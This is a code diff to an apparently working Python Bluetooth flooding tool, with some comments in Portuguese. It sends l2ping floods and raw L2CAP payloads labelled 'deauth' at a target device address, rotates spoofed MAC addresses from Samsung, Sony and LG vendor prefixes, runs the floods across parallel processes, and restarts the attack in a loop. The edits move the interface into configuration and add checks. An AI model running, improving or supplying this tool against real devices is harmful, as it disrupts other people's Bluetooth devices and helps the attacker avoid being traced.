@@ -6,7 +6,7 @@ from dotenv import load_dotenv
 from rich import print
 from rich.console import Console
 from utils.macaddress_gen import generate_mac_address
-# from macaddress_gen import generate_mac_address
+import bluetooth
 
 load_dotenv()
 TARGET_DEVICE_MAC = os.getenv('TARGET_DEVICE_MAC')
@@ -14,8 +14,12 @@ interface = os.getenv('INTERFACES')
 
 console = Console()
 max_threads = 10
-
 threads_count = min(multiprocessing.cpu_count(), max_threads)
+
+# Verificação de interface
+if not interface:
+    console.print("[red] Interface de Bluetooth não encontrada. Verifique o arquivo .env.")
+    exit(1)
 
 # [ OUI Numbers for Mac Address ]
 SPOOFED_MACS = [
@@ -25,28 +29,21 @@ SPOOFED_MACS = [
     generate_mac_address("Samsung"),
     generate_mac_address("Sony"),
     generate_mac_address("LG")
-    # Add more MAC addresses here if needed
 ]
 
 # [ 2x Deauth Method ]
 def deauth_Method_1(target_addr, packages_size):
-    subprocess.Popen(['l2ping', '-i', 'hci0', '-s', str(packages_size), '-f', target_addr], stdout=subprocess.DEVNULL)
+    subprocess.Popen(['l2ping', '-i', interface, '-s', str(packages_size), '-f', target_addr], stdout=subprocess.DEVNULL)
     time.sleep(2)
 
 def deauth_Method_2(target_addr, packages_size):
-    import bluetooth
-
-    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
-    bd_addr = (target_addr, bluetooth.L2CAP_PSM_HCI)
-
     try:
-        sock.connect(bd_addr)
-        sock.settimeout(10)  # Set a timeout for the deauthentication request
+        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+        sock.connect((target_addr, 0x1001))  # Canal L2CAP para HCI
+        sock.settimeout(10)
 
-        # Send deauthentication packets
         payload = b'\x01' * packages_size
         sock.send(payload)
-
         print("Deauthentication request sent successfully.")
     except bluetooth.btcommon.BluetoothError as e:
         print("Failed to send deauthentication request:", str(e))
@@ -57,6 +54,7 @@ def change_mac_address(interface, mac_address):
     subprocess.call(['ifconfig', interface, 'down'])
     subprocess.call(['ifconfig', interface, 'hw', 'ether', mac_address])
     subprocess.call(['ifconfig', interface, 'up'])
+    time.sleep(1)  # Pequena espera para estabilidade
 
 def _kick_(deauth_func, target_addr, packages_size, threads_count, start_time=1):
     for i in range(start_time, 0, -1):
@@ -64,15 +62,6 @@ def _kick_(deauth_func, target_addr, packages_size, threads_count, start_time=1)
         time.sleep(1)
         console.clear()
     console.print('[red] :rocket: Starting')
-
-    # spoofed_mac_index = 0
-    # [ Spofing Mac Adress during every attack ]
-    # for _ in range(threads_count):
-    #     spoofed_mac = SPOOFED_MACS[spoofed_mac_index % len(SPOOFED_MACS)]
-    #     spoofed_mac_index += 1
-    #
-    #     change_mac_address(interface, spoofed_mac)
-    #     multiprocessing.Process(target=Deauth, args=(target_addr, packages_size)).start()
 
     with multiprocessing.Pool(processes=threads_count) as pool:
         results = [pool.apply_async(deauth_func, args=(target_addr, packages_size)) for _ in range(threads_count)]
@@ -85,6 +74,5 @@ if __name__ == '__main__':
             print("Restarting Attack in 10s")
             time.sleep(10)
     except KeyboardInterrupt:
-        time.sleep(0.1)
         console.print('\n[red] :fax: Aborted')
         exit()
